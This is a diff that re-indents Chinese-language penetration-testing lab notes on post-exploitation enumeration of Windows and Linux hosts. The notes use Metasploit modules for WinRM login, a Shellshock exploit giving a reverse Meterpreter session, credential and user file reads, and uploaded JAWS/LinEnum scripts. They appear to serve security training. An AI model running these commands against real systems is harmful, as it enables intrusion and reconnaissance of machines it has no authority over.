@@ -87,25 +87,24 @@
 	顯示 ARP 快取以發現目標網路上的其他 IP 位址
 	arp -a
 	
-	Interface: 10.0.21.159 --- 0x16
-	  Internet Address      Physical Address      Type
-	  10.0.16.1             06-73-41-c8-ca-42     dynamic   
-	  10.0.24.47            06-6d-76-fa-cd-9e     dynamic   
-	  10.0.24.176           06-20-14-ab-88-8c     dynamic   
-	  10.0.31.103           06-4d-7a-33-38-c2     dynamic  
+		Interface: 10.0.21.159 --- 0x16
+		  Internet Address      Physical Address      Type
+		  10.0.16.1             06-73-41-c8-ca-42     dynamic   
+		  10.0.24.47            06-6d-76-fa-cd-9e     dynamic   
+		  10.0.24.176           06-20-14-ab-88-8c     dynamic   
+		  10.0.31.103           06-4d-7a-33-38-c2     dynamic  
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	查看目標系統上的服務正在使用的開放連接埠列表，
-		netstat -ano
-	=> 顯示目標系統上開啟的連接埠清單及其各自的狀態和進程 ID (PID)
+	netstat -ano
 	
-	Proto  Local Address          Foreign Address        State           PID
-	  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       2232
-	  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       600
-	  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
-	  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       1860
+ 	=> 顯示目標系統上開啟的連接埠清單及其各自的狀態和進程 ID (PID)
+		Proto  Local Address          Foreign Address        State           PID
+		  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       2232
+		  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       600
+		  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
+		  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       1860
 ## Enumerating Processes and Services
-	枚舉進程與服務
-	=> 顯示目標系統上執行的所有進程的列表，以及進程 ID (PID)、使用者和程式路徑
+	枚舉進程與服務 => 顯示目標系統上執行的所有進程的列表，以及進程 ID (PID)、使用者和程式路徑
 	meterpreter > ps
 	
 		PID   PPID  Name                Arch  Session  User                           Path
@@ -172,18 +171,18 @@
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	searchsploit WinRM  
 		WinRM - VBS Remote Code Execution (Metasploit)          | windows/remote/22526.rb 
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	msfconsole -q
-		search WinRM
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		msfconsole -q
+			search WinRM
+		
+			use scanner/winrm/winrm_auth_methods
+			set RHOST demo.ine.local
+			set RPORT 5985
+			set SSL false
+			run
 	
-		use scanner/winrm/winrm_auth_methods
-		set RHOST demo.ine.local
-		set RPORT 5985
-		set SSL false
-		run
-
-	[+] 10.0.23.37:5985: Negotiate protocol supported
-	[+] 10.0.23.37:5985: Basic protocol supported
+		[+] 10.0.23.37:5985: Negotiate protocol supported
+		[+] 10.0.23.37:5985: Basic protocol supported
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	use auxiliary/scanner/winrm/winrm_login 
 		set PASSWORD anything
@@ -204,23 +203,23 @@
 		set PASSWORD tinkerbell
 		set FORCE_VBS false
 		run
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	meterpreter > background
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		meterpreter > background
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	自動列舉目前使用者權限: 
 	use post/windows/gather/win_privs
 		set SESSION 2
 		run
 
-	Current User
-	============
-	 Is Admin  Is System  Is In Local Admin Group  UAC Enabled  Foreground ID  UID
-	 --------  ---------  -----------------------  -----------  -------------  ---
-	 True      False      True                     True         1              SERVER\Administrator
+		Current User
+		============
+		 Is Admin  Is System  Is In Local Admin Group  UAC Enabled  Foreground ID  UID
+		 --------  ---------  -----------------------  -----------  -------------  ---
+		 True      False      True                     True         1              SERVER\Administrator
 
-	Windows Privileges
-	==================
-	 SeBackupPrivilege
+		Windows Privileges
+		==================
+		 SeBackupPrivilege
 
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	列舉目前和先前登入的使用者的清單:
@@ -228,17 +227,17 @@
 		set SESSION 2
 		run
 
-	SID                                            Profile Path
-	 ---                                            ------------
-	 S-1-5-18                                       C:\Windows\system32\config\systemprofile
+		SID                                            Profile Path
+		 ---                                            ------------
+		 S-1-5-18                                       C:\Windows\system32\config\systemprofile
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	是否為虛擬機器: 
 	use post/windows/gather/checkvm
 		set SESSION 2
 		run
 
-	=> Checking if the target is a Virtual Machine \
-	[+] This is a Xen Virtual Machine
+		=> Checking if the target is a Virtual Machine \
+		[+] This is a Xen Virtual Machine
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	列舉目標系統上已安裝的應用程式/程式的清單:
 	use post/windows/gather/enum_applications
@@ -252,13 +251,13 @@
  	use post/windows/gather/enum_computers
 		set SESSION 2
 		run
-	此模組顯示目標系統不屬於 Windows 網域
+		此模組顯示目標系統不屬於 Windows 網域
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	列舉已安裝的更新和修補程式的清單:
 	use post/windows/gather/enum_patches
 		set SESSION 2
 		run
-	(HotFixID)
+		(HotFixID)
  ## Automating local enumeration with JAWS
 	=> JAWS是一個開源 PowerShell 腳本
 	(https://github.com/411Hall/JAWS) jaws-enum.ps1 
@@ -277,12 +276,11 @@
 		shell
 		powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt
 		(將花費幾分鐘時間來完成枚舉過程)
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	meterpreter > 
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		meterpreter > 
 		download JAWS-Enum.txt
 # Linux Local Enumeration 
 ## Enumerating System Information - Linux
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	nmap -sV demo.ine.local
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	msfconsole -q
@@ -298,84 +296,82 @@
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	枚舉系統資訊
 	meterpreter > sysinfo
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	列舉系統的主機名稱
-		shell
-		/bin/bash -i
-		hostname
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	動識別 Linux 發行版名稱和發行版本
-		cat /etc/issue
-		cat /etc/*release
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	Linux 核心的版本
-		uname -a
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	識別有關目標系統上正在使用的 CPU 的硬體資訊
-		lscpu
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	查看Linux系統附加的儲存設備清單以及各自的掛載點和儲存容量資訊
-		df -h
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		列舉系統的主機名稱
+			shell
+			/bin/bash -i
+			hostname
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		動識別 Linux 發行版名稱和發行版本
+			cat /etc/issue
+			cat /etc/*release
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		Linux 核心的版本
+			uname -a
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		識別有關目標系統上正在使用的 CPU 的硬體資訊
+			lscpu
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		查看Linux系統附加的儲存設備清單以及各自的掛載點和儲存容量資訊
+			df -h
 ## Enumerating Users & Groups - Linux
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	有權存取的當前用戶: 
 	meterpreter > getuid
 		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-		shell
-		/bin/bash -i
-		whoami
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	列舉 root 使用者所屬的群組: 
-		groups root
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	取得Linux系統上的其他使用者和服務帳戶的清單:
-		cat /etc/passwd
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	列舉系統上存在的群組列表:
-		groups
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	查看目前登入的使用者:
-		who
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	取得最近登入系統的使用者清單
-	lastlog
+  		列舉系統的主機名稱
+			shell
+			/bin/bash -i
+			whoami
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		列舉 root 使用者所屬的群組: 
+			groups root
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		取得Linux系統上的其他使用者和服務帳戶的清單:
+			cat /etc/passwd
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		列舉系統上存在的群組列表:
+			groups
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		查看目前登入的使用者:
+			who
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		取得最近登入系統的使用者清單
+			lastlog
 ## Enumerating Network Information - Linux
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	枚舉網路資訊:
-		meterpreter > ifconfig
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	取得目標系統上開放連接埠的清單
-		netstat
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	路由表
-		route
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	顯示連接到目標系統的網路介面清單
-	background
-		sessions -i 1
-		/bin/bash -i
-		ip a s
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	列舉已配置網路及其子網路的清單：
-		cat /etc/networks
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	列舉本地映射的網域及其各自的 IP 位址的清單
-		cat /etc/hosts
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	識別預設的 DNS 名稱伺服器位址
-		cat /etc/resolv.conf
+	meterpreter > ifconfig
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		取得目標系統上開放連接埠的清單
+			netstat
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		路由表
+			route
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		顯示連接到目標系統的網路介面清單
+		background
+			sessions -i 1
+			/bin/bash -i
+			ip a s
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		列舉已配置網路及其子網路的清單：
+			cat /etc/networks
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		列舉本地映射的網域及其各自的 IP 位址的清單
+			cat /etc/hosts
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		識別預設的 DNS 名稱伺服器位址
+			cat /etc/resolv.conf
 ## Enumerating Processes and Cron Jobs
 	列舉目標系統上正在運行的進程列表:
-		meterpreter > ps
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	尋找特定服務的PID: 
-		pgrep vsftpd
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	列舉 Kali Linux 系統上的 cron 作業清單
-		ls -al /etc/cron*
+	meterpreter > ps
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		尋找特定服務的PID: 
+			pgrep vsftpd
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		列舉 Kali Linux 系統上的 cron 作業清單
+			ls -al /etc/cron*
 
 ## Automating Linux Local Enumeration
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	ifconfig (192.23.89.2)
 	msfconsole -q
 		use exploit/multi/http/apache_mod_cgi_bash_env_exec
@@ -383,8 +379,8 @@
 		set TARGETURI /gettime.cgi
 		set LHOST 192.23.89.2
 		exploit
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	meterpreter > background
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		meterpreter > background
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	列舉 Linux 目標上的設定檔列表
 		use post/linux/gather/enum_configs
@@ -398,31 +394,31 @@
 		set SESSION 1
 		run
 	
-	[+] Network config 
-	[+] Route table 
-	[+] DNS config
+		[+] Network config 
+		[+] Route table 
+		[+] DNS config
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	自動枚舉本機系統資訊
 		use post/linux/gather/enum_system
 		set SESSION 1
 		run
 	
-	[+]     Module running as "daemon" user
-	[*] Linux version
-	[*] User accounts
-	[*] Installed Packages
-	[*] Cron jobs 
-	[*] Disk info 
-	[*] Logfiles 
-	[*] Setuid/setgid 
-	[*] CPU Vulnerabilities 
+		[+]     Module running as "daemon" user
+		[*] Linux version
+		[*] User accounts
+		[*] Installed Packages
+		[*] Cron jobs 
+		[*] Disk info 
+		[*] Logfiles 
+		[*] Setuid/setgid 
+		[*] CPU Vulnerabilities 
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	使用 LinEnum 自動執行本地枚舉
 	(https://github.com/rebootuser/LinEnum) --  LinEnum.sh 
-		nano LinEnum.sh 
-		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-		sessions 1
-		meterpreter > cd /tmp
+	nano LinEnum.sh 
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	sessions 1
+	meterpreter > cd /tmp
 		upload /root/LinEnum.sh
 		shell
 		/bin/bash -i
